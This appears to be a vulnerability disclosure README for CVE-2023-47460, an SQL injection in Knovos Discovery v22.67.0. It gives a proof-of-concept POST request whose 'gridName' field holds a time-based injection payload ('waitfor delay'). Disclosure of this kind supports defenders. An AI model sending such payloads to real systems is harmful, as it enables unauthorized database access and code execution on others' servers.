# CVE-2023-47460

## Description

SQL injection vulnerability in Knovos Discovery v.22.67.0 allows a remote attacker to execute arbitrary code via the /DiscoveryProcess/Service/Admin.svc/getGridColumnStructure component

## Vulnerability Type

SQL Injection

## Vendor of Product

Knovos Discovery

## Affected Product Code Base

Version 22.67.0 - Version 22.67.0

## Affected Component

/DiscoveryProcess/Service/Admin.svc/getGridColumnStructure

## Attack Type

Remote

## Impact Code execution

true

## Impact Information Disclosure

true

## Discoverer

- Aleksey Vistorobskiy

## Attack Vectors

authorized user


Request:
```
POST /DiscoveryProcess/Service/Admin.svc/getGridColumnStructure?caseMappingId=*** HTTP/1.1
Host: vuln_host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 73
Connection: close

{
  "gridName":"Inventory-grid' waitfor delay'0:0:50'--",
  "uID":"10"
}

```

Response:
![](/1.jpg)

## Reference

- https://www.knovos.com/
- https://github.com/aleksey-vi/CVE-2023-47460
